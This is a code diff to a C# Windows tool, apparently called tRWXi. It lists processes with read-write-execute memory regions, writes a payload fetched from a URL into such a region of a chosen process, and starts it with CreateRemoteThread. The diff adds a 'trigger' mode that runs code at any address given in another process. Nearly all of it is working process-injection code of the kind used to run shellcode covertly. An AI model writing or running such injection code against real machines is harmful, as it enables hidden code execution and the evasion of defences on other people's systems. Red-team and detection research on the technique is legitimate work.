@@ -3,8 +3,9 @@ using System.Runtime.ConstrainedExecution;
 using System.Runtime.InteropServices;
 using System.Security;
 using System.Collections.Generic;
-using System.IO;
-using System.Text;
+using tRWXi.Data;
+using tRWXi.Utils;
+using System.Linq;
 
 namespace tRWXi
 {
@@ -88,10 +89,28 @@ namespace tRWXi
 
                 bool hResult = Process32First(hSnapshot, ref pe);
 
-                Dictionary<int, string> processes = new Dictionary<int, string>();
+                Dictionary<int, List<Data.ProcessMemoryInfo>> processes = new Dictionary<int, List<ProcessMemoryInfo>>();
 
                 IntPtr nbw = IntPtr.Zero;
 
+                if (parameters.ContainsKey("trigger"))
+                {
+                    if (parameters.ContainsKey("pid") && parameters.ContainsKey("address"))
+                    {
+                        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, Convert.ToInt32(parameters["pid"]));
+                        IntPtr res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, new IntPtr(Convert.ToInt64(parameters["address"], 16)), IntPtr.Zero, 0, IntPtr.Zero);
+                        Console.WriteLine("[!] Trying to execute code from provided memory");
+                        if (res != null)
+                        {
+                            Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
+                        }
+                        Environment.Exit(1);
+                    } else
+                    {
+                        Helper.help();
+                        Environment.Exit(0);
+                    }
+                }
                 if (parameters.ContainsKey("enumerate") || (parameters.ContainsKey("url") && parameters.ContainsKey("pid")))
                 {
                     Console.WriteLine("[!] Started enumeration");
@@ -99,6 +118,7 @@ namespace tRWXi
                     while (hResult)
                     {
                         IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (int)pe.th32ProcessID);
+
                         while (VirtualQueryEx(hProcess, lpAddress, out mbi, Marshal.SizeOf(mbi)) != 0)
                         {
                             lpAddress = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
@@ -106,8 +126,12 @@ namespace tRWXi
                             {
                                 if (!processes.ContainsKey((int)pe.th32ProcessID))
                                 {
-                                    processes.Add((int)pe.th32ProcessID, pe.szExeFile);
+                                    processes[(int)pe.th32ProcessID] = new List<ProcessMemoryInfo>();
+                                }
+                                processes[(int)pe.th32ProcessID].Add(new ProcessMemoryInfo((int)pe.th32ProcessID, pe.szExeFile, hProcess, mbi.BaseAddress, mbi.RegionSize));
 
+                                if (parameters.ContainsKey("inject"))
+                                {
                                     if (parameters.ContainsKey("pid") && parameters.ContainsKey("url"))
                                     {
                                         if (Convert.ToInt32(parameters["pid"]) == (int)pe.th32ProcessID)
@@ -119,6 +143,11 @@ namespace tRWXi
                                             Console.WriteLine("Written " + nbw.ToString() + " bytes into RWX region");
                                             CreateRemoteThread(hProcess, IntPtr.Zero, 0, mbi.BaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
                                         }
+                                    }
+                                    else
+                                    {
+                                        Helper.help();
+                                        Environment.Exit(0);
                                     }
                                 }
                             }
@@ -137,9 +166,14 @@ namespace tRWXi
 
                 if (parameters.ContainsKey("enumerate"))
                 {
-                    foreach (KeyValuePair<int, string> pair in processes)
+                    foreach (KeyValuePair<int, List<ProcessMemoryInfo>> kv in processes)
                     {
-                        Console.WriteLine(String.Format("[+] Found RWX regions in PID: {0} -> {1}", pair.Key, pair.Value));
+                        string pName = kv.Value.First().processName;
+                        Console.WriteLine(String.Format("[+] {0} -> {1}: ", kv.Key, pName));
+                        foreach (ProcessMemoryInfo pmi in kv.Value)
+                        {
+                            Console.WriteLine(String.Format("\thandler::{0}\tbaseAddress::0x{1:X}\tsize::{2}", pmi.handler, pmi.baseAddress.ToInt64(), pmi.size));
+                        }
                     }
                 }
             }
